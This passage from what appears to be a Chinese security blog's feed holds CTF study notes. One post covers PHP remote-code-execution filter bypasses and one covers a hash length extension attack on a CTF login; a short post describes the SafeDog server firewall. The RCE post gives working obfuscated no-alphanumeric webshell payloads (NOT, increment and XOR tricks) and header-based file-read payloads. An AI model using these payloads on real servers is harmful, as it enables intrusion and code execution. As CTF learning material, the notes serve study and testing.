href="%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%20rce.md">数学函数进制转换 rce</a></th></tr></thead></table><p> <a href="https://xz.aliyun.com/t/8107?time__1311=n4+xuDgDBDyGD=DOFD/D0ioQdAKtR+2GYmiD&alichlgref=https://blog.csdn.net/qq_61778128/article/details/127063407">无字母数字webshell总结 - 先知社区 (aliyun.com)</a></p><p>PHP5和PHP7的区别</p><ul><li>PHP5中，assert()是一个函数，我们可以用$<em>&#x3D;assert;$</em>()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的语言结构，不再支持上面那种调用方法。(不过貌似这点存疑，我在PHP7.1中确实不允许再使用这种调用方法了，但是网上有人貌似在PHP7.0.12下还能这样调用，可能是7.1及以上不行??)</li><li>PHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();</li></ul><h4 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过:"></a>无字符绕过:</h4><p><a href="https://ab-alex.github.io/2019/10/17/RCE%E6%8F%90%E9%AB%98%E7%AF%87/">就让我们 看看进阶版版本的rce吧 </a></p><p><a href="https://xz.aliyun.com/t/11929?time__1311=mqmx0DBG0QExlxx2DUr4fhDArsFAd3x&alichlgref=https://www.google.com/">最屌的 </a></p><h4 id="​取反绕过"><a href="#​取反绕过" class="headerlink" title="​取反绕过"></a>​取反绕过</h4><p>取反跟异或原理上差不多，唯一不同的是运算的逻辑不一样,当然这跟我们半毛钱关系都没有，我们也不需要手算，我就是纯属凑个字数。</p><p>这个非常简单，就是把命令先取反，然后在上传的时候，加一个取反符号‘~’，再在服务器上进行一次取反运算，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;system&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$ans2</span>=<span class="string">&#x27;ls&#x27;</span>;<span class="comment">//命令</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到system</span></span><br><span class="line"><span class="variable">$data2</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans2</span>));<span class="comment">//通过两次取反运算得到dir</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data2</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="​自增绕过："><a href="#​自增绕过：" class="headerlink" title="​自增绕过："></a>​自增绕过：</h4><p>‘a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符母。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line">这个可以当作一个 get参数传递</span><br><span class="line"></span><br><span class="line">这个可以自己实现哟!!!</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);</span><br><span class="line"></span><br><span class="line">这个是两个post传递参数</span><br><span class="line"></span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">这个感觉像是 <span class="keyword">eval</span>后执行的 函数</span><br></pre></td></tr></table></figure><h4 id="​异或绕过"><a href="#​异或绕过" class="headerlink" title="​异或绕过"></a>​异或绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">def <span class="keyword">xor</span>():</span><br><span class="line"></span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span>  file1:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                result=i^j</span><br><span class="line">                <span class="comment"># 判断字符可见</span></span><br><span class="line">                a=<span class="title function_ invoke__">chr</span>(i) <span class="keyword">if</span> <span class="title function_ invoke__">chr</span>(i).<span class="title function_ invoke__">isprintable</span>() <span class="keyword">else</span> urllib.parse.<span class="title function_ invoke__">quote</span>(<span class="title function_ invoke__">chr</span>(i))</span><br><span class="line">                b = <span class="title function_ invoke__">chr</span>(j) <span class="keyword">if</span> <span class="title function_ invoke__">chr</span>(j).<span class="title function_ invoke__">isprintable</span>() <span class="keyword">else</span> urllib.parse.<span class="title function_ invoke__">quote</span>(<span class="title function_ invoke__">chr</span>(j))</span><br><span class="line">                test=a+<span class="string">&#x27;^&#x27;</span>+b+<span class="string">&#x27; == &gt; &#x27;</span>+<span class="title function_ invoke__">chr</span>(result)+<span class="string">&quot; ASCII:&quot;</span>+<span class="title function_ invoke__">str</span>(result)+<span class="string">&quot;\n&quot;</span></span><br><span class="line">                file1.<span class="title function_ invoke__">write</span>(test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">xor</span>()</span><br></pre></td></tr></table></figure><p>先利用脚本将异或的组合列出来<br>然后将需要的命令拼接出来。<br>列如：phpinfo()<br>(‘GGGGGGG’^’7&#x2F;7.)!(‘)();<br> 其中’G’^’7’&#x3D;p，’G’^’&#x2F;‘&#x3D;h…………依次类推拼出你想得到的命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br><span class="line">即：?code=<span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在有时候，字母和输入全被过滤掉的时候，可以用不可打印字符来进行命令执行。可以稍微改一下上边的脚本，将字符url编码之后再输出，这时候就能绕过去了。</p><table><thead><tr><th>异或绕过 使用echo 先打印后执行</th><th><a href="%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%20rce.md">数学函数进制转换 rce</a></th></tr></thead></table><h4 id="通过添加UA头"><a href="#通过添加UA头" class="headerlink" title="通过添加UA头"></a>通过添加UA头</h4><p><strong>SimpleRCE原题</strong></p><p>重点是添加UA头为你想读取的文件<br>User_Agent:&#x2F;flag  </p><p>一些payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(apache_request_headers()));</span><br><span class="line">aaa=show_source(apache_request_headers()[&#x27;User-Agent&#x27;]);</span><br></pre></td></tr></table></figure><p>User_agent 这个可以自定义这个值和变量。</p><ol><li><p><strong><code>getallheaders()</code></strong>：这个函数可以获取当前请求的所有头信息，并以一个关联数组的形式返回。</p><p> <code>$headers = getallheaders();</code></p></li><li><p><strong><code>$_SERVER</code> 超全局数组</strong>：你也可以通过 <code>$_SERVER</code> 数组访问请求头。大部分请求头会以 <code>HTTP_</code> 前缀的形式存储在这个数组中。</p><p> <code>$userAgent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hash扩展攻击</title>
      <link href="/2024/11/30/hash%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2024/11/30/hash%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="楚慧杯为例"><a href="#楚慧杯为例" class="headerlink" title="楚慧杯为例"></a>楚慧杯为例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./my.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$secret</span>);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&quot;adminpassword&quot;</span>));</span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;password&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;source&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line"> </span><br><span class="line">         <span class="comment">// 在验证用户后，如果登录成功，设置会话变量来表示用户已登录</span></span><br><span class="line">          <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">          <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">// 用户名</span></span><br><span class="line">          <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">// 用户角色或权限</span></span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;upload.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;你的cookie好像不太对啊&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;可不会轻易放你进去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">879</span>bd10c8628894d388c068a25326c21</span><br></pre></td></tr></table></figure><p>hash长度扩展攻击，知道一个字符串的长度和这个字符串的hash。我们可以计算 a+b的hash<br>但是前提是我们还需要知道原本a中的一段明文。明文的长度可以在知道的范围内随便选。</p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>直接python 运行相关脚本就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全狗</title>
      <link href="/2024/11/25/%E5%AE%89%E5%85%A8%E7%8B%97/"/>
      <url>/2024/11/25/%E5%AE%89%E5%85%A8%E7%8B%97/</url>
      
        <content type="html"><![CDATA[<h4 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h4><p><a href="https://www.safedog.cn/server_safedog.html">https://www.safedog.cn/server_safedog.html</a></p><h4 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h4><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241125151423.png" alt="image.png"></p><h5 id="首页功能点"><a href="#首页功能点" class="headerlink" title="首页功能点"></a>首页功能点</h5><p>可以看到安全狗不仅仅是作为一个web防火墙，他针对整个服务器进行防护。</p><h6 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h6><p>服务器优化,杀毒操作 都可以提高服务器安全性。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241125151857.png" alt="image.png"></p><h5 id="系统防护"><a href="#系统防护" class="headerlink" title="系统防护"></a>系统防护</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20241125152212.png" alt="image.png"></p><p>主要就是系统相关的安全性操作</p><h5 id="网络防护"><a href="#网络防护" class="headerlink" title="网络防护"></a>网络防护</h5><ul><li>ddos防火墙</li><li>arp   防火墙</li><li>web防火墙 </li><li>应用防火墙</li></ul><p>配置都是傻瓜式操作 。</p>]]></content>
      
      
      <categories>
          
          <category> 安全设备 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全设备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>app大致框架</title>
      <link href="/2024/11/17/app%E5%A4%A7%E8%87%B4%E6%A1%86%E6%9E%B6/"/>
